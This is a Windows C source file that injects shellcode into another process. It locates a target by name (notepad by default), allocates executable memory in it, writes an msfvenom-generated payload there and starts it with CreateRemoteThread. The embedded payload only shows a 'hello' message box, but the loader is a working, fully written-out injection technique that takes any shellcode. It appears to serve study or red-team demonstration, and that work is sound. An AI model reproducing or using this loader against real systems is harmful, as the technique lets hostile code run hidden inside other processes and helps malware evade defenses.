#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <tchar.h>

// Generated with:
// bundle exec ruby ./msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c -v SHELLCODE
unsigned char SHELLCODE[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
"\x4c\x8d\x85\x04\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
"\xd5\x68\x65\x6c\x6c\x6f\x00\x68\x65\x6c\x6c\x6f\x00";

BOOL has_process_name_matching(HANDLE hProcess, TCHAR* search_string) {
	TCHAR szProcessName[MAX_PATH] = TEXT("");
	HMODULE hMod[1024] = { 0 };
	DWORD cbNeeded;

	// Ensure the module list in the target process is not corrupted, and is initialized
	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
	{
		GetModuleBaseName(hProcess, hMod[0], szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
	}

	//_tprintf(TEXT("process name %s\n"), szProcessName);
	//_tprintf(TEXT("modules %d\n"), cbNeeded / sizeof(HMODULE));

	BOOL res = _tcsstr(szProcessName, search_string) != NULL ? TRUE : FALSE;
	return res;
}

DWORD get_pid_by_name(TCHAR *name) {
	DWORD pids[4096] = { 0 };
	DWORD cbNeeded;

	if (!EnumProcesses(
		&pids,
		sizeof(pids),
		&cbNeeded
	)) {
		printf("pid array not large enough\n");
		return NULL;
	}

	DWORD pidCount = cbNeeded / sizeof(DWORD);
	for (int i = 0; i < pidCount; i++) {
		int pid = pids[i];
		//printf("pid: %d\n", pid);
		HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

		if (!processHandle) {
			continue;
		}

		BOOL is_process_name_match = has_process_name_matching(processHandle, name);
		CloseHandle(processHandle);
		if (is_process_name_match) {
			return pid;
		}
	}

	return NULL;
};

int main_virtual_alloc_ex_shell_code(int argc, const char* argv[]) {
	TCHAR* process_name;
	if (argc != 2) {
		printf("error: requires process name to search for - defaulting to notepad\n");
		process_name = TEXT("notepad");
	}
	else {
		int ascii_str_length = strlen(argv[1]);
		// Plus null byte
		int process_name_plus_null_length = ascii_str_length + 1;
		process_name = (TCHAR*)malloc(process_name_plus_null_length * sizeof(TCHAR));

		size_t outsize;
		mbstowcs_s(&outsize, process_name, process_name_plus_null_length, argv[1], ascii_str_length);
	}

	// Try to search by process name
	DWORD pid = get_pid_by_name(process_name);
	if (pid == NULL) {
		_tprintf(TEXT("failed to find pid by name %s - is it running?\n"), process_name);
		printf("after");
		return 1;
	}

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	printf("process handle was %d\n", processHandle);
	printf("last error was %d\n", GetLastError());

	LPVOID *base = VirtualAllocEx(
		processHandle,
		NULL,
		sizeof(SHELLCODE),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	printf("memory address location 0x%016llx\n", base);
	printf("last error was %d\n", GetLastError());

	SIZE_T bytesWritten;
	WriteProcessMemory(
		processHandle,
		base,
		SHELLCODE,
		sizeof(SHELLCODE),
		&bytesWritten
	);

	printf("total bytes written: %d\n", bytesWritten);
	printf("last error was %d\n", GetLastError());

	HANDLE remoteThread = CreateRemoteThread(
		processHandle,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) base,
		NULL,
		NULL,
		0,
		NULL
	);

	printf("injection finished\n");
}
